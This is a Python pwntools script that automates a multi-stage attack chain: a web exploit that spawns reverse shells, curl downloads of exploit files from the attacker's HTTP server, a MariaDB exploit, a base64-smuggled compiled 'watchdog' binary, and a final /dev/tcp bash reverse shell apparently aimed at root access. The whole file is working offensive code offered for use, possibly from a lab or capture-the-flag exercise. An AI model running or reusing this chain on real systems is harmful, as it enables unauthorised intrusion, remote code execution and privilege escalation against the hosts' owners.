from pwn import *
from os import system
import sys

import http.server
import socketserver
import threading
import os

from base64 import b64encode

context.log_level = "debug"

def create_server():
    def start_http_server(port=8000):
        handler = http.server.SimpleHTTPRequestHandler
        
        socketserver.TCPServer.allow_reuse_address = True
        
        with socketserver.TCPServer(("", port), handler) as httpd:
            print(f"[+] HTTP Server serving CWD ({os.getcwd()}) on port {port}")
            httpd.serve_forever()

    server_thread = threading.Thread(target=start_http_server, args=(8000,))
    server_thread.daemon = True
    server_thread.start()

try:
    LHOST = sys.argv[1]
    MARIADB_RHOST = sys.argv[2]
    WEBSERVER_RHOST = sys.argv[3]
except:
    print("Usage: python master.py [LHOST] [MARIADB_RHOST] [WEBSERVER_RHOST]")
    sys.exit(1)

def web_exploit(shell1, shell2):
    print("[!] triggering revshell connections on webserver")
    system(f"python web_exploit.py http://{WEBSERVER_RHOST}:5000 {LHOST} 9998")
    conn2 = shell2.wait_for_connection()
    system(f"python web_exploit.py http://{WEBSERVER_RHOST}:5000 {LHOST} 9999")
    conn1 = shell1.wait_for_connection()
    return conn1, conn2

def get_exploit_files(conn):
    conn.sendline(f"cd /tmp; curl -X GET http://{LHOST}:8000/mdb_exploit.py -o mdb_exploit.py; curl -X GET http://{LHOST}:8000/watchdog_exploit.py -o watchdog_exploit.py".encode())

def mariadb_exploit(conn1, conn2):
    conn2.sendline("nc -lnvp 9000")
    conn1.sendline(f"python3 /tmp/mdb_exploit.py -H {MARIADB_RHOST} -l {WEBSERVER_RHOST}")
    conn1.recvrepeat(timeout=6)

def watchdog_exploit(conn):
    system("musl-gcc -Os -static -s -o wexp watchdog_exploit.c")
    system("base64 wexp > wexp.b64")
    watchdog = open("wexp.b64", "r").read().split("\n")
    for line in watchdog:
        conn.sendline(f"echo {line} >> /tmp/wexp.b64")
    conn.sendline("base64 -d /tmp/wexp.b64 > /tmp/wexp")
    conn.sendline("chmod +x /tmp/wexp")

def root_revshell(conn1, conn2):
    conn1.sendline("nc -lnvp 9001")
    payload = f"#!/bin/bash\nsh -i >&/dev/tcp/{WEBSERVER_RHOST}/9001 0>&1".encode()
    conn2.sendline(f"echo {b64encode(payload).decode()} | base64 -d > /tmp/revshell.sh")
    conn2.sendline("chmod +x /tmp/revshell.sh")
    conn2.sendline(f"/tmp/wexp /tmp/revshell.sh")

if __name__ == "__main__":
    conn1, conn2 = web_exploit(listen(9999), listen(9998))
    create_server()
    get_exploit_files(conn1)
    mariadb_exploit(conn1, conn2)
    watchdog_exploit(conn2)
    root_revshell(conn1, conn2)

    context.log_level = 'debug'
    conn1.interactive()
